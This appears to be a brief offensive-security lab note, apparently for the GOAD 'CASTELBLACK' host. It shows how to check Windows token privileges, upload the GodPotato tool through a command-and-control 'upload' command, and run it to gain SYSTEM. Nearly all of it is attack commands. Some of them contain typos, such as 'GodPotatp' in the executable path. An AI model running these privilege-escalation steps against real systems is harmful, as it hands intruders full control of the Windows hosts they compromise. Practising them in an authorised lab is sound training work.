# Run Commands:
```
shell whoami /priv
```

Run GodPotato using Methic:
```
shell c:\Windows\Temp\GodPotatp-NET35.exe -cmd whoami
```

Have a look if you are using "System" account.
# Upload File
You can upload files by typing upload and pressing double tab and select the files you want to uplaod.
```
upload -fileName GodPotato-NET35.exe -Host CASTELBLACK -Path GodPotato-NET35.exe
```

OR

```
upload -PATH c:/Windows/Temp <tab><tab>
```
